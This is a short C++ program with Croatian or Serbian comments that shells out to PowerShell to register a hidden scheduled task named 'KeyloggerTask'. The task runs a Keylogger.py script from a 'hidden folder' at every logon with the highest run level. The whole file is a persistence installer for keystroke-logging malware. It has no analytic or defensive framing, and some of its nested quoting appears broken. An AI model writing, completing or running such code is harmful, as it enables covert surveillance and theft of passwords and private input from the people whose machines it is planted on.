#include <cstdlib>

int main() {
	
    // PowerShell skripta kao argument
    const char* command = "powershell.exe -Command \"if (Get-ScheduledTask -TaskName 'KeyloggerTask' -ErrorAction SilentlyContinue) { Write-Output 'Task vec postoji.' } else { $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c \"C:\\skriveni_folder\\Keylogger.py\"'; $trigger = New-ScheduledTaskTrigger -AtLogon; $principal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType ServiceAccount -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries:$true -DontStopIfGoingOnBatteries:$true; $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings; Register-ScheduledTask -TaskName 'KeyloggerTask' -InputObject $task }\"";

    // Poziv cmd-a koji pokrece powershell sa argumentima
    system(command);

    return 0;
}
